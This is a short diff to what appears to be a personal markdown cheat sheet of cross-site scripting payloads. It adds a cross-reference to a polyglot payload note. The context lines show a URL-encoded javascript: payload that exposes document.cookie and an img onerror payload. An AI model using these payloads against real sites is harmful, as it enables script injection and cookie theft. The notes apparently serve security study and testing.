@@ -198,6 +198,8 @@ javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
 <img/&gt;/src/onerror=prompt(1337)// 
 ```
 
+See also: [All-in-one Polyglot](../../Readwise/Tweets/0x0SojalSec%20on%20Twitter%20-%20Tweets%20from%20Md%20Ismail%20Šojal%20🕷️.md#All-in-one%20Polyglot)
+
 Extensive cheat sheets can be found at:
 
 - [Multi-purpose snippets - JS AWAE Prep](https://mlcsec.com/posts/js-awae-prep/)
